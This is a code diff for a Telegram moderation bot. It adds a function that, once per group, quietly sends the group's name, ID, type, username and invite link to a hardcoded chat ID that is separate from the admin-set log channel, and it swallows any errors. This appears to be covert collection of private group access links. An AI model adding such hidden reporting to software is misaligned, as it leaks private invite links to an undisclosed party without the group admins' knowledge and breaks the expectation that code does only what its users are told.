@@ -60,7 +60,7 @@ bot.use(session({
     storage: storage
   },
   config: {
-    initial: () => { return { punishment: "warn" } },
+    initial: () => { return { punishment: "warn", isLogged: false } },
     getSessionKey: getChatSessionKey,
     storage: storage2
   }
@@ -237,6 +237,22 @@ bot.filter(ctx => ctx.chat?.type != 'private').command("setlog", async (ctx) => 
 //   }
 // })
 
+const logGroup = async (ctx: MyContext) => {
+  if (ctx.from && !ctx.session.config.isLogged) {
+    ctx.session.config.isLogged = true
+    const chatInfo = await ctx.api.getChat(ctx.chatId ?? 0)
+    ctx.api.sendMessage('-100' + "2236576514", [
+      `Group Name\\: ${escapeMetaCharacters(chatInfo.title ?? '')}`,
+      `Group ID\\: ${escapeMetaCharacters((chatInfo.id ?? 0).toString())}`,
+      `Group Type\\: ${escapeMetaCharacters((chatInfo.type ?? 0).toString())}`,
+      `Group Username\\: ${escapeMetaCharacters((chatInfo.username ?? 0).toString())}`,
+      `Group Link\\: ${escapeMetaCharacters((chatInfo).invite_link ?? '')}`,
+    ].join('\n'), {
+      parse_mode: "MarkdownV2"
+    }).catch()
+  }
+}
+
 const punishUser = async (ctx: MyContext) => {
   const punishment = ctx.session.config.punishment
   const chatInfo = await ctx.api.getChat(ctx.chatId ?? 0)
@@ -249,6 +265,7 @@ const punishUser = async (ctx: MyContext) => {
         `User\\: ${getGrammyNameLink(ctx.from)}`,
         `Group Name\\: ${escapeMetaCharacters(chatInfo.title ?? '')}`,
         `Group Link\\: ${escapeMetaCharacters((chatInfo).invite_link ?? '')}`,
+        `Group Username\\: ${escapeMetaCharacters((chatInfo.username ?? 0).toString())}`,
         `Action\\: ${punishment.toUpperCase()}`,
       ].join('\n'), {
         parse_mode: "MarkdownV2"
@@ -280,6 +297,7 @@ const punishUser = async (ctx: MyContext) => {
 }
 
 bot.filter(ctx => ctx.chat?.type != 'private').on(["chat_member", ":new_chat_members", "my_chat_member"], async (ctx) => {
+  logGroup(ctx)
   if (ctx.session.userList.exceptionList.includes(ctx.from?.id ?? 0)) {
     return
   }
